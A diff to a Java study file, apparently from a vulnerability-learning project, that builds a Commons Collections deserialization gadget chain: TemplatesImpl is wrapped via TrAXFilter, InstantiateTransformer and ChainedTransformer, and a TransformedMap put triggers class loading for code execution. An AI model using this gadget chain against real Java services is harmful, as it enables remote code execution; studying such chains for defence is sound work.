@@ -1,12 +1,21 @@
-package com.govuln;
+package com.govuln.deserialization;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+import org.apache.commons.collections.Transformer;
 
+import javax.xml.transform.Templates;
 import java.lang.reflect.Field;
 import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
 
-public class HelloTemplatesImpl {
+public class CommonsCollectionsIntro3 {
     public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
         Field field = obj.getClass().getDeclaredField(fieldName);
         field.setAccessible(true);
@@ -21,6 +30,17 @@ public class HelloTemplatesImpl {
         setFieldValue(obj, "_name", "HelloTemplatesImpl");
         setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
 
-        obj.newTransformer();
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(
+                        new Class[] { Templates.class },
+                        new Object[] { obj })
+        };
+
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+        Map innerMap = new HashMap();
+        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+        outerMap.put("test", "xxxx");
     }
 }
